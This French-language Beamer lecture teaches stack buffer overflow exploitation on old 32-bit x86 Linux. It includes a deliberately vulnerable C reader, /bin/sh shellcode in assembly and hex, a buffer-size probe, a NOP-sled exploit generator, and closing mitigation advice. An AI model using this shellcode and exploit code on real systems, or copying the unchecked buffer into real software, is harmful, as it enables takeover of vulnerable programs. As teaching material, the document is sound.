%---------------------------------------------------------------------------
\svnidlong 
{$HeadURL: https://svn.fil.univ-lille1.fr/svn/sedoglav_PDC/trunk/Cours/10/10.tex $} 
{$LastChangedDate: 2012-03-09 15:52:32 +0100 (Fri, 09 Mar 2012) $} 
{$LastChangedRevision: 74 $} 
{$LastChangedBy: sedoglav $} 
\svnid{$Id: 10.tex 74 2012-03-09 14:52:32Z sedoglav $} 
%------------------------------------------------------------------------------
\begin{frame}
  \frametitle{Avertissement}%
  Les codes de bas niveau suivants correspondent \`a une architecture
  --- pentium --- aujourd'hui obsol\`ete. 
  \par\bigskip
  Les principes g\'en\'eraux restent tout de m\^eme valables sur les
  machines actuelles.
  \par\bigskip
  L'objectif principal est d'illustrer l'usage de la pile tout en
  sensibilisant au maximum l'auditoire \`a la n\'ecessit\'e de la
  \emph{pratique} du langage.
  \par\bigskip
  \emph{Quand on a d\'epass\'e les bornes, il n'y a pas de limite.}
\end{frame}
%------------------------------------------------------------------------------
\section{Une mauvaise utilisation des variables automatiques}
\begin{frame}[fragile]
  \frametitle{Technique du d\'ebordement de pile~: un probl\`eme
    d'utilisation de la pile d'ex\'ecution}%
  La technique de d\'ebordement de pile est tr\'es utilis\'ee pour
  ex\'ecuter du code malveillant.  Pour ce faire, il faut qu'une
  application critique pr\'esente une vuln\'erabilit\'e. Par exemple~:
\begin{verbatim}
#include <stdio.h>
#define TAILLE 88
#define STOP '\xF8'
void lecture(FILE *flux){  char tampon[TAILLE] ;
                           unsigned int foo = 0 ;
  /* le probl\`eme est dans la ligne suivante */
  while ( (tampon[foo++]=fgetc(flux)) != STOP ) ; 
}
int main(void){  FILE *fichier = fopen("piege","r") ;
                 lecture(fichier) ;
                 fclose(fichier) ;
                 return 0 ;                         }
\end{verbatim}
  La condition d'arr\^et \verb?'\xF8'? est adopt\'ee pour simplifier
  la suite de nos manipulations.
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}
  La fonction \texttt{getchar} pourrait \^etre remplac\'ee par
  n'importe quelle fonction remplissant la m\'emoire tampon \`a partir
  d'une socket, du clavier, etc.  L'erreur de programmation est
  d'autoriser \`a \'ecrire plus de \texttt{TAILLE} octets dans
  \texttt{tampon}.
  \begin{center}
    \begin{tabular}{ll}
     \begin{tabular}[b]{c|c|}
       \hline
       \%ESP & tampon \\
       &  var.\ loc.\\
       & \\\hline
       \%EBP & \%EBP1   \\\hline
       & adresse  \\
       & de retour   \\\hline
       & param\`etres    \\\hline
       & $\vdots$\\
       \hline
    \end{tabular} &
    \begin{minipage}[b]{5cm}
      La fonction \texttt{getchar} ne v\'erifie pas le nombre d'octets
      qu'elle copie dans le buffer tampon.
      \par\medskip
      Si par erreur le tampon est rempli, elle continue malgr\`es tout
      son travail et \'ecrase l'adresse de retour ce qui provoque une
      erreur lors du \texttt{ret}.
      \par\medskip
      L'\emph{instruction} ex\'ecut\'ee apr\`es le \texttt{ret} est
      celle se trouvant \`a l'adresse sp\'ecifi\'ee par ce que
      \texttt{getchar} \`a plac\'ee sur la pile.
    \end{minipage}
    \end{tabular}
  \end{center}
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Le d\'ebordement de pile proprement dit~: exemple
    d'\'ecrasement de l'adresse de retour}%
  Le d\'ebordement de pile consiste \`a modifier l'adresse de retour
  \`a l'exemple du code suivant~:
\begin{verbatim}
#include <stdio.h>                               
void                       int 
function                   main 
(void){                   (void){
  int  foo =    0 ;           int x = 0 ;        
  int *ret = &foo ;           function() ;      
                              x = 1 ;            
    ret  += 3 ;               printf("%d\n",x) ; 
  (*ret) += 7 ;               return 0 ;                 
}                           }                    
\end{verbatim}
  L'ex\'ecution de ce programme affiche~$0$ et non~$1$. Attention,
  cette astuce est intimement li\'ee \`a l'architecture de
  l'ordinateur ex\'ecutant le code.
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}
  \begin{center}
      \begin{tabular}{ccc}
    avant le call & 
    apr\`es le call & 
    dans function \\
    \begin{tabular}{|c|}
      \hline
      ${x=0}$  \\\hline
      main \%\textsc{ebp} \\\hline
    \end{tabular} &
    \begin{tabular}{|c|}
      \hline
      adresse de retour  \\\hline
      ${x=0}$  \\\hline
      main \%\textsc{ebp}  \\\hline
    \end{tabular} &
    \begin{tabular}{|c|}
      \hline
      ${\textup{ret}= \&\textup{foo} }$  \\\hline
      ${ \textup{foo}= 0 }$  \\\hline
      adresse de retour  \\\hline
      ${ x= 0 }$  \\\hline
      main \%\textsc{ebp}  \\\hline
    \end{tabular}
  \end{tabular}
  \end{center}
  \begin{itemize}
  \item Initialement, le pointeur \texttt{ret} dans la pile pointe sur
    la variable \texttt{foo}.
  \item Apr\`es incr\'ementation de~$1$, le pointeur \texttt{ret}
    pointe sur l'adresse de retour.
  \item On peut ainsi incr\'ementer cette derni\`ere et ne pas
    ex\'ecuter l'instruction suivant le call dans la fonction
    appelante i.e.\ l'affectation de~$1$ \`a~$x$ dans la fonction
    \texttt{main} (\`a condition de savoir sur combien d'octets elle
    est cod\'ee).
  \end{itemize}
\end{frame}
%------------------------------------------------------------------------------
\section{Un peu de code octal}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Quel code voudrait on voir s'ex\'ecuter}%
  Prenons maintenant la question sous un autre angle~: quelles
  instructions devrions nous faire ex\'ecuter pour contr\^oler la
  ressource ex\'ecutant le code vuln\'erable~?  Si on dispose d'appels
  syst\`eme, d'un shell et de commandes externes, tout est permis~:
  \begin{verbatim}
#include <stdio.h>
char *name[2] ;
int main(void){ name[0] = "/bin/sh"       ;
                name[1] = NULL            ;
                execve(name[0],name,NULL) ; }
\end{verbatim}
  Dans ce cas, un shell est ouvert \`a l'agresseur qui peut faire ce
  qu'il veut avec les droits du propri\'etaire du code attaqu\'e.
  \par
  Un d\'evermineur permet de voir ce que fait le processeur en
  ex\'ecutant ce code. Mais comme nous ma\^\i{}trisons l'assembleur,
  utilisons le.
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Traduction en code assembleur}%
  Le code pr\'ec\'edent s'exprime en assembleur par un appel
  syst\`eme (cod\'e par une interruption plut\^ot qu'un
  \texttt{call execve})~:
\begin{verbatim}
    .text
txt:
     .string "/bin/sh"
     .long txt
     .long 0
.globl _start
_start:
     movl $0xb,%eax    /* num\`ero de l'appel syst\`eme   */
     movl $txt,%ebx    /* nom du programme \`a ex\`ecuter */
     movl $txt+8,%ecx  /* argument du shell               */
     movl %ecx,%edx    /* variables d'environnement       */
     addl $4,%edx    
     int $0x80
done:  
     movl    $0,%ebx  /* Ces instructions permettent de    */ 
     movl    $1,%eax  /* terminer l'ex\'ecution du code    */
     int     $0x80    /* assembleur et sont indispensables */
\end{verbatim}
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}[fragile] 
\frametitle{Apr\`es compilation et avant \'edition de liens}
\begin{verbatim}
                      .text
0000 2F62696E txt:    .string "/bin/sh"
     2F736800 
0008 00000000         .long txt      /* En prime on obtient
000c 00000000         .long 0           m\^eme le code
                      .globl _start     hexad\'ecimal
0010 B80B0000 _start: movl $0xb,%eax    correspondant i.e.
     00                                 le code dans le
0015 BB000000         movl $txt,%ebx    segment de code
     00                                 ex\'ecut\'e par
001a B9080000         movl $txt+8,%ecx  la machine      */
     00
001f 89CA             movl  %ecx,%edx    
0021 83C204           addl  $4,%edx      
0024 CD80             int   $0x80
0026 BB000000 done:   movl  $0,%ebx    
     00
002b B8010000         movl  $1,%eax   
     00
0030 CD80             int   $0x80     
\end{verbatim}
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}
  \frametitle{Adressage relatif des \'etiquettes}%
  Le premier probl\`eme rencontr\'e est que l'on ne sait pas o\`u ce
  trouve les donn\'ees de notre programme en m\'emoire i.e.\ on ne
  conna\^\i{}t pas l'\'etiquette \texttt{txt}.
  \par\bigskip
  Pour s'en sortir, on se sert de la pile --- une fois encore --- et
  du fait que les instructions call et jmp peuvent prendre un argument
  relatif (une constante).
  \par\bigskip
  Si on place un \texttt{call} juste avant les donn\'ees, l'adresse de
  retour --- correspondant aux donn\'ees --- sera empil\'ee et pourra
  \^etre d\'epil\'ee avec un \texttt{pop}.
  \par\bigskip
  Il ne restera plus qu'\`a r\'ecup\'erer cette adresse et brancher
  sur le code que l'on d\'esire ex\'ecuter.
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Application de ce principe}%
\begin{verbatim}
 0000 E8100000  call .+0x15
      00
 0005 2F62696E  .string "/bin/sh"
      2F736800 
 000d 00000000  .long 0           /* pour un pointeur     */  
 0011 00000000  .long 0           /* NULL                 */
 0015 5B        pop  %ebx         /* adresse de "/bin/sh" */
 0016 895B08    movl %ebx,8(%ebx) /* placer le pointeur   */
 0019 B80B0000  movl $0xb,%eax    /* num\`ero de l'appel  */
      00
 001e 8D4B08    leal 8(%ebx), %ecx 
 0021 8D530C    leal 12(%ebx), %edx
 0024 CD80      int  $0x80
 0026 BB000000  movl $0,%ebx     /* pour sortir proprement */
      00
 002b B8010000  movl $1,%eax    
      00 CD80   int  $0x80      
\end{verbatim}
  Ce code ne peut pas marcher comme un processus normal car il \'ecrit
  dans le segment de code\ldots\ mais on peut le faire par
  d\'ebordement.
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Comment tester notre code}%
Le code ex\'ecutable ci-dessus peut \^etre plac\'e dans une variable automatique~:
\begin{verbatim}
void bar(void){
  int foo, *pfoo = &foo ;
  char shellcode[] = "\xE8\x10\x00\x00\x00\x2F\x62\x69\x6E" 
                     "\x2F\x73\x68\x00\x00\x00\x00\x00\x00"
                     "\x00\x00\x00\x5B\x89\x5B\x08\xB8\x0B"
                     "\x00\x00\x00\x8D\x4B\x08\x8D\x53\x0C" 
                     "\xCD\x80\xBB\x00\x00\x00\x00\xB8\x01"
                     "\x00\x00\x00\xCD\x80" ;
/* canoniquement void (*foo)()=(void *) shellcode; foo();*/
/* mais pour notre propos, \'ecrasons l'adresse de retour */
  *(pfoo+5) =  shellcode ; /* heureusement, C est laxiste */
}

int main(void){ bar() ; return 0 ; }
\end{verbatim}
Le shellcode pourrait \^etre stock\'e dans un fichier texte lu par le code
vuln\'erable.
\end{frame}
%------------------------------------------------------------------------------
\section{Du code dans la pile~?}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Pourquoi la pile serait-elle ex\'ecutable~?}%
  Avec un peu de chance i.e.\ une architecture laxiste, le code sur la
  pile est ex\'ecut\'e~:
\begin{verbatim}
    % ./mshell
    sh-2.05b%
\end{verbatim}%
  En th\'eorie, chaque segment (donn\'ees, code, pile) est
  ind\'ependant des autres et l'acc\`es est contr\^ol\'e.  Depuis
  le~$80386$, des m\'ecanismes physiques interdisent d'ex\'ecuter le
  contenu d'un segment hors code.  Mais en pratique (au moins pour
  Linux et Windows), certains segments sont partag\'es (ss, ds, es) et
  d'autres se recouvrent (cs)~:
\begin{verbatim}
    cs     0x23     35      ds     0x2b     43
    ss     0x2b     43      es     0x2b     43
\end{verbatim}%
  En effet, l'adressage d'un segment se fait sur~$2^{32}$ octets
  i.e.~$4$ giga octets (toute la m\'emoire actuellement disponible).
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{D\'eterminer la distance entre le d\'ebut du buffer du code
  vuln\'erable et l'adresse de retour}% 
  Pour conna\^\i{}tre les limites, on peut pousser \`a
  la faute. Dans notre cas, on peut soumettre des fichiers de plus en
  plus grand au programme vuln\'erable~:
  \begin{verbatim}
#include<stdio.h>
#include<stdlib.h>
int main(int argc, char **argv){
  int i ;
  if(argc!=2)
    return 1 ;
  FILE *fichier = fopen("piege","w") ; /*                    
  i = atoi(argv[1]) ;                  % ./taillebuffer 99   
  for(;i>0;i--)                        % ./vulnerable        
    fputc('a',fichier) ;               % ./taillebuffer 100  
                                       % ./vulnerable        
  fputc('\xF8',fichier) ;              Segmentation fault    
  fclose(fichier) ;                    */                    
  return 0 ;
}
  \end{verbatim}
\end{frame}
%------------------------------------------------------------------------------
\section{Placer le pi\`ege}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Quelle doit \^etre la nouvelle adresse de retour~?}%
  On conna\^\i{}t la distance entre le d\'ebut du buffer et l'adresse
  de retour. De plus, on peut --- dans notre cas --- avoir une vague
  id\'ee de l'adresse du sommet de la pile.
  \par
  La fonction suivante retourne le pointeur de pile~:
\begin{verbatim}
unsigned int SommetPile(void){  int main(void){             
  __asm__("movl %esp,%eax") ;   printf("%lu\n",SommetPile()); 
}                               return 0 ;                }
  \end{verbatim}
  \par
  La pile est partag\'ee par plusieurs processus apparent\'es et on peut parier 
  sur la taille des empilements fait par le code cible avant de passer dans la 
  zone vuln\'erable.
  \par
  adresse de retour = 
  \begin{tabular}[t]{l}
  ancien pointeur de pile + taille buffer \\ \mbox{}+ impr\'ecisions
  \end{tabular}
  \par
  Encore une fois, chaque pile associ\'ee \`a un processus devrait
  \^etre ind\'ependante des autres\ldots\ mais ce n'est pas le cas.
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}
  \frametitle{Mise en place du pi\`ege,  gestion de l'impr\'ecision, etc. }%
  Mais tout cela reste approximatif. Comment s'en contenter alors que
  l'adresse de la prochaine instruction \`a ex\'ecuter doit
  \^etre pr\'ecise~?
  \par\bigskip
  L'instruction assembleur \texttt{nop} (ne rien faire) cod\'ee en
  hexad\'ecimal par~$90$ peut compl\'eter notre shellcode sans
  perturber son fonctionnement.
  \par\bigskip
  Il suffit de commencer \`a remplir le buffer avec cette instruction.
  M\^eme si l'adresse de retour est trop grande, l'instruction
  d\'esign\'ee sera un nop et tous les nop seront ex\'ecuter sans
  cons\'equence avant l'ex\'ecution du shellcode.
  \par\bigskip
  De plus, on s'autorise plusieurs tentatives en faisant varier la
  taille du buffer par exemple.
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Pla\c{c}ons le pi\`ege}%
  \begin{verbatim}
#include<stdio.h>
#define SHELLCODESIZE 50
char shellcode[] = "\xE8\x10\x00\x00" etc. "\x00\xCD\x80" ;
int main(int argc, char **argv){ 
  unsigned long int i, taille, base ;
  base = strtoul(argv[2],NULL,0) ;
  base -= taille = strtoul(argv[1],NULL,0) ;  
  base -= strtoul(argv[3],NULL,0);            
  for( i=0 ; i<taille-SHELLCODESIZE ; i++)    
    putchar('\x90');                          
  for( i=0 ; i<SHELLCODESIZE ; i++)          
    putchar(shellcode[i]);
  char * res = (char *) &base ;
  for(i=0;i<sizeof(int);i++) /* le piege fonctionne                 
    putchar(*(res+i));       %exploit 108 `SommetPile` 0>piege   
  putchar('\xF8') ;          % vulnerable                                     
  return 0 ;                 sh-2.05b$                              
}                            */                                   
  \end{verbatim}
\end{frame}
%------------------------------------------------------------------------------
\section{Ce n'est pas si simple}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Quelques remarques}%
  Il existe des architectures n'utilisant pas le passage de
  param\`etres par la pile (PowerPC pour un petit nombre de
  param\`etres par exemple --- mais pour un grand nombre, une pile
  d'ex\'ecution est utilis\'ee).
  \par\medskip
  Attention le cas \'ech\'eant \`a supprimer l'ensemble des~\texttt{0} %
  --- sinon un \texttt{scanf} par exemple le prendrait pour la fin de
  la cha\^\i{}ne \`a charger. Pour s'en sortir il faut \'ecrire du
  code \'equivalent~:
\begin{verbatim}
\xB8\x0B\x00\x00\x00 movl $0xb,%eax 
\x31\xC0             xor %eax,%eax /*mets %eax \`a z\'ero*/
\xB0\x0B             movb $0xb,%al
\end{verbatim}
\par
C'est du beau ``computer art'', une disparition \`a la Perec\ldots 
\par
Le choix de la condition d'arr\^et (\verb?'\xF8'?) dans notre exemple
provient du fait qu'EOF est cod\'e par (\verb?'\xFF'?) et que ce
caract\`ere intervient dans la d\'efinition de l'adresse \`a laquelle
on veut brancher dans la pile~: le shell code n'est donc pas lu
jusqu'au bout.
\end{frame}
%------------------------------------------------------------------------------
\begin{frame}
  \frametitle{Comment placer notre pi\`ege}%
  Il faut d\'ecouvrir une faiblesse dans le code attaqu\'e~:
  \begin{itemize}
  \item soit on d\'esassemble le code (consulter le code octal)~;
  \item soit on consulte les faiblesses publi\'ees par le concepteur
    du programme (ou les utilisateurs).
  \end{itemize}
  Ensuite,    il ne  reste  plus    qu'\`a  pr\'eparer  le pi\`ege ---
  construire le code assembleur ouvrant une faille --- et le soumettre
  \`a la cible~:
  \begin{itemize}
  \item dans notre cas, mettre le pi\`ege  dans un fichier et le faire
    lire par le code vuln\'erable~;
  \item  pour  l'attaque d'un serveur, scanner  syst\'ematiquement les
    ports  de  machines   pour   voir   s'ils  abritent  un    service
    vuln\'erable.
  \end{itemize}
  Le code pi\`ege peut ne pas \^etre un fichier mais dans des paquets
  soumis \`a un serveur qui lit sur un port de la machine cible\ldots
  \par
  En~$2001$, CodeRed a infect\'e~$400\, 000$ serveurs windows en
  utilisant un d\'ebordement de pile.
\end{frame}
%------------------------------------------------------------------------------
\section{En tout cas, ne pas d\'eborder les tampons}
%------------------------------------------------------------------------------
\begin{frame}[fragile]
  \frametitle{Morale \`a retenir}%
  Il est important de toujours tenir compte de la taille des tampons et
  de faire attention lors de l'usage de fonctions~:
  \begin{center}
    \begin{tabular}{c|c}
      proscrire & utiliser \\ \hline
   \verb?gets? & 
   \verb?fgets?
      \\
   \verb?strcpy? &
   \verb?strncpy?
      \\
   \verb?strcat? &
   \verb?strncat?
      \\
    \verb+scanf+, \verb+sprintf+, etc.  &
    \end{tabular}
  \end{center}
  Certains compilateur prennent en charge l'interdiction du
  d\'ebordement de tampon (patch StackShield pour gcc).
  \par\bigskip
  Un fichier au format \textsc{elf} contient un drapeau indiquant si
  le noyau ou l'\'editeur de liens dynamique doivent consid\'erer la
  pile comme ex\'ecutable ou pas. Le programme \texttt{execstack}
  permet de manipuler ce drapeau.
\end{frame}
%------------------------------------------------------------------------------

